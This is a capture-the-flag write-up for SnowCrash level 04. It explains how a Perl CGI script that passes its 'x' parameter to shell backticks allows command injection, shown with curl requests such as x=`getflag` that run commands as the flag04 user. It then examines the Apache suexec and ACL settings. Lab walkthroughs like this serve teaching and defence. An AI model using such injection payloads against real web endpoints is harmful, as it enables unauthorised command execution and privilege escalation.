# LEVEL 04

## Vulnerability & exploit

Command substitution on argument provided by privileged user -> Privilege escalation via CGI code injection

## Initial Context

In our home directory, we have a perl script owned by flag04 with suid/guid bit - which means that it will be executed with the rights of its owner (flag04)

```
level04@SnowCrash:~$ ls -la level04.pl
-rwsr-sr-x 1 flag04 level04 152 Mar  5  2016 level04.pl
```

From reading the file's content, we see that it's expected to be run the Apache server on port 4747.

## Solving the challenge

First, let's understand what the script does:

```
#!/usr/bin/perl
# localhost:4747
use CGI qw{param}; // Set up a Common Gateway Interface, through which the Apache server will run the program and return its output
print "Content-type: text/html\n\n";
```

It will set up a Common Gateway Interface, through which the Apache server will run the program and return its output

```
sub x {
  $y = $_[0];
  print `echo $y 2>&1`;
}
x(param("x"));
```

We see that only the first argument will be kept as \$y - which in the case of a string, will be its first word.
Then, a [command substitution](https://www.gnu.org/savannah-checkouts/gnu/bash/manual/bash.html#Command-Substitution) is done to capture the output of the echo command, in order to print it (and this output will, in turn, be returned through the CGI).
Finally, this subroutine will be called on a argument named 'x'

We therefore know that we should pass one word as x.
If that word is a string like "hello", it should be output when running the program:

```
level04@SnowCrash:~$ ./level04.pl x="hello"
Content-type: text/html

hello
```

More interestingly, if we use the convenient backtick notation, we can pass a command and ensure it's run and its output captured and echoed by the subroutine:

```
level04@SnowCrash:~$ ./level04.pl x=`whoami`
Content-type: text/html

level04
```

This is surprising, since the suid bit should make the script run as flag04.
This is because, as of perl 5.14.0, suid/guid bits on scripts are ignored by perl due to security reasons, as seen [here](https://mattmccutchen.net/suidperl.html)
And indeed:

```
level04@SnowCrash:~$ perl --version

This is perl 5, version 14, subversion 2 (v5.14.2) built for i686-linux-gnu-thread-multi-64int
```

But what happens if we run it on port 4747 as instructed?

```
level04@SnowCrash:~$ curl '127.0.0.1:4747/level04.pl?x=`whoami`'
flag04
```

This is who we want to run getflag as! So if we replace `whoami` with `getflag`:

```
level04@SnowCrash:~$ curl '127.0.0.1:4747/level04.pl?x=`getflag`'
Check flag.Here is your token : XXXXXXXXXXXXXXXXXXXXXXXXXX
```

---

### Side notes on permissions

Let's see why the script is run as flag04 on the apache server:
Initially, the permissions are those of the server running on that port - in this case, Apache.
If we filter the current processes, we can see that Apache is running as www-data (we can ignore the process leader running as root):

```
level04@SnowCrash:~$ ps aux | egrep apache
root      1424  0.0  0.6  21340  6188 ?        Ss   01:09   0:01 /usr/sbin/apache2 -k start
www-data  1444  0.0  0.3  21364  3564 ?        S    01:09   0:00 /usr/sbin/apache2 -k start
www-data  1445  0.0  0.3  21364  3564 ?        S    01:09   0:00 /usr/sbin/apache2 -k start
www-data  1446  0.0  0.4  21412  4256 ?        S    01:09   0:00 /usr/sbin/apache2 -k start
www-data  1447  0.0  0.4  21412  4256 ?        S    01:09   0:00 /usr/sbin/apache2 -k start
www-data  1448  0.0  0.4  21412  4256 ?        S    01:09   0:00 /usr/sbin/apache2 -k start
level04   2868  0.0  0.0   4376   812 pts/0    S+   04:08   0:00 egrep --color=auto apache
```

If we look at the script run by the server (not the one in our home directory but another stored somewhere in /var/www)

```
level04@SnowCrash:~$ ls -la `find /var/www -name level04.pl 2>/dev/null`
-r-xr-x---+ 1 flag04 level04 152 Oct 20 01:09 /var/www/level04/level04.pl
```

And at its extended permissions (ACL):

```
level04@SnowCrash:~$ getfacl /var/www/level04/level04.pl
getfacl: Removing leading '/' from absolute path names
# file: var/www/level04/level04.pl
# owner: flag04
# group: level04
user::r-x
group::r-x
group:www-data:r-x
mask::r-x
other::---
```

Everything seems to be set up to run the script as wwww-data, but we know that's not the case since the script clearly runs as flag04, and there is no connection between www-data and flag04:

```
level04@SnowCrash:~$ groups www-data
www-data : www-data
level04@SnowCrash:~$ groups flag04
flag04 : flag04 flag
```

Let's see if there is any configuration to change the default behavior:

```
level04@SnowCrash:~$ ls /etc/apache2/sites-enabled/
000-default  level05.conf  level12.conf

level04@SnowCrash:~$ cat /etc/apache2/sites-enabled/level05.conf
<VirtualHost *:4747>
	DocumentRoot	/var/www/level04/
	SuexecUserGroup flag04 level04
	<Directory /var/www/level04>
		Options +ExecCGI
		DirectoryIndex level04.pl
		AllowOverride None
		Order allow,deny
		Allow from all
		AddHandler cgi-script .pl
	</Directory>
</VirtualHost>
```

Despite the error in the filename, we see that the scrip in /var/www/level04 will in fact be run with user flag04 and group level04.
